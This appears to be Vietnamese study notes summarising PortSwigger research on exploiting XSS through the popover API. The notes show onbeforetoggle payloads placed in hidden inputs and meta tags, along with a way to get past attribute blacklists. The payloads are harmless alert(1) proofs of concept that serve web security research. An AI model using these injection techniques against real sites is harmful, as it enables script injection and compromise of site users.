 ---
- **Published:** 11 July 2023 at 13:00 UTC
- **Updated:** 11 July 2023 at 13:00 UTC
- Source: [Exploiting XSS in hidden inputs and meta tags | PortSwigger Research](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)

### Introduction
Tính năng mới của trình duyệt gọi là [popover](https://developer.chrome.com/blog/introducing-popover-api?hl=vi) cho phép đánh dấu một phần tử bằng thuộc tính `popover` để nó bị ẩn cho tới khi được bật bởi một trigger có `popovertarget` (ví dụ: `button`). Với popover bạn có thể dùng hai sự kiện liên quan là `onbeforetoggle` (chạy **trước** khi popover mở/đóng) và `ontoggle` (chạy **sau** khi trạng thái thay đổi).
Điều hay ho là `onbeforetoggle` thường khó có thể bị chặn trên blacklist thuộc tính
```html
<button popovertarget=x>Click me</button>
<xss onbeforetoggle=alert(1) popover id=x>XSS</xss>
```
### XSS in hidden input
Popover có thể hoạt động với input `hidden` -> Điều này quan trọng vì trước đây XSS nằm trong `input type="hidden"` khó khai thác và hầu hết event không kích hoạt được 
```html
<button popovertarget=x>Click me</button> # point 1
<input type="hidden" value="y" popover id=x onbeforetoggle=alert(1)> #point 2
```
Ta có thể thấy chúng ta cần 2 điểm để injection XSS. Thứ nhất sẽ là `<buton ...>` và điểm còn lại sẽ có thuộc tính trigger xss. Tuy nhiên trong trường hợp popover có thể đang được sử dụng và handle 1 `popover` có id, nếu ta có thể chèn được một `popover` khác có id trùng với cái kia và được browser xử lí trước thì hoàn toàn có thê thực thi mã js.
```html
<!-- Injection occurs inside a hidden input attribute -->
<input type="hidden" value="y" popover id=x onbeforetoggle=alert(1)>

<!-- Existing popup code-->
<div id=x popover>I'm a popup</div>
<button popovertarget=x>Click</button>
<!-- End existing code -->
```

### XSS in meta tag
```html
<head>
<!-- Injection occurs inside meta attribute -->
<meta name="apple-mobile-web-app-title" content="Twitter" popover id=newsletter onbeforetoggle=alert(1) />
</head>
<body>
<!-- Existing code -->
<button popovertarget=newsletter>Subscribe to my newsletter</button>
<div popover id=newsletter>My newsletter popup</div>
<!-- End existing code -->
</body>
```
